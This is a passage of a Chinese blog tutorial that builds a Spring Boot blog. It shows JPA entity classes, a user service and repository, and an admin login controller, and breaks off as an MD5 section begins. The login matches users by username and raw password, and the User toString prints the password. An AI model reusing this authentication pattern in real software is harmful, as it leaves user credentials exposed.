com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.NotBlank;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_type&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;分类名称不能为空哦&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;type&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Blog&gt; blogs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">getBlogs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlogs</span><span class="params">(List&lt;Blog&gt; blogs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Type&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tag.java 标签实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_tag&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tag</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToMany(mappedBy = &quot;tags&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Blog&gt; blogs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">getBlogs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlogs</span><span class="params">(List&lt;Blog&gt; blogs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Tag&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Comment.java 评论实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String nickname;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String avatar;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Blog blog;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;parentComment&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; replyComments = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Comment parentComment;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Comment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickname</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickname = nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAvatar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAvatar</span><span class="params">(String avatar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.avatar = avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getCreateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCreateTime</span><span class="params">(Date createTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blog = blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getReplyComments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replyComments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setReplyComments</span><span class="params">(List&lt;Comment&gt; replyComments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replyComments = replyComments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Comment <span class="title">getParentComment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parentComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParentComment</span><span class="params">(Comment parentComment)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.parentComment = parentComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Comment&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, nickname=&#x27;&quot;</span> + nickname + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, content=&#x27;&quot;</span> + content + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, avatar=&#x27;&quot;</span> + avatar + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>User.java 用户实体类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String nickname;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> String avatar;</span><br><span class="line">    <span class="keyword">private</span> Integer type;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date CreateTime;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;user&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Blog&gt; blogs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickname</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickname = nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAvatar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAvatar</span><span class="params">(String avatar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.avatar = avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setType</span><span class="params">(Integer type)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getCreateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> CreateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCreateTime</span><span class="params">(Date createTime)</span> </span>&#123;</span><br><span class="line">        CreateTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getUpdateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUpdateTime</span><span class="params">(Date updateTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">getBlogs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlogs</span><span class="params">(List&lt;Blog&gt; blogs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blogs = blogs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, nickname=&#x27;&quot;</span> + nickname + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, avatar=&#x27;&quot;</span> + avatar + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, type=&quot;</span> + type +</span><br><span class="line">                <span class="string">&quot;, CreateTime=&quot;</span> + CreateTime +</span><br><span class="line">                <span class="string">&quot;, updateTime=&quot;</span> + updateTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="后台登录业务"><a href="#后台登录业务" class="headerlink" title="后台登录业务"></a>后台登录业务</h3><p>UserService.java User登录业务逻辑处理接口类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function">User <span class="title">checkUser</span><span class="params">(String username,String password)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserServiceImpl.java User登录业务逻辑处理实现类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.UserRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">checkUser</span><span class="params">(String username, String password)</span> </span>&#123;</span><br><span class="line">        User user = userRepository.findByUsernameAndPassword(username,password);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UserRepository.java 引用SpringJPA SQL操作接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>,<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function">User <span class="title">findByUsernameAndPassword</span><span class="params">(String username,String password)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LoginController.java WEB登录模块控制器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web.admin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.UserService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.support.RedirectAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/admin&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">loginPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;admin/login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password, HttpSession session, RedirectAttributes attributes)</span></span>&#123;</span><br><span class="line">        User user = userService.checkUser(username,password);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="keyword">null</span>)&#123;</span><br><span class="line">            user.setPassword(<span class="keyword">null</span>);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;admin/index&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            attributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;用户名和密码存在异常错误&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/logout&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">logout</span><span class="params">(HttpSession session)</span></span>&#123;</span><br><span class="line">        session.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><p>MD5Utils.java MD5加密工具类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 